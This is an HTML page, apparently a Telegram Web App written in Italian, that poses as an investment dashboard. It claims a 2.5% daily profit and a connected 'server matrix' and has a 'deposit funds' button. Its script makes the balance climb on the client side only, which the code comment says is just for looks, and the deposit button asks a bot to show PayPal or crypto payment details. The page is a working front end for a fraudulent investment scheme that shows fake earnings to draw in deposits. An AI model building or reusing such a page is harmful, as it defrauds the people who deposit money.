<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 20px; text-align: center; }
        .card { background: #111; border: 1px solid #333; border-radius: 20px; padding: 25px; margin-top: 20px; }
        .balance { font-size: 40px; color: #00ff88; font-weight: bold; margin: 15px 0; }
        .btn { width: 100%; background: #00ff88; color: #000; border: none; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 10px; }
        .live-status { font-size: 10px; color: #00ff88; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="live-status">● Server Matrix Connesso</div>

    <div class="card">
        <div style="font-size: 12px; opacity: 0.5;">RENDITA ATTIVA (EUR)</div>
        <div class="balance">€ <span id="bal">0.0000</span></div>
        <div style="font-size: 11px; color: #00ff88;">+ 2.5% Profitto Giornaliero</div>
    </div>

    <button class="btn" onclick="richiediPagamento()">➕ DEPOSITA FONDI</button>
    <button class="btn" style="background: transparent; color: #fff; border: 1px solid #333;" onclick="window.Telegram.WebApp.close()">ESCI</button>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // Incremento fluido lato client (per bellezza)
        let s = 0;
        setInterval(() => { s += 0.0001; document.getElementById('bal').innerText = s.toFixed(4); }, 200);

        function richiediPagamento() {
            // Chiude l'app e manda il comando al bot per mostrare PayPal/Crypto
            tg.sendData("INFO_PAGAMENTO");
        }
    </script>
</body>
</html>
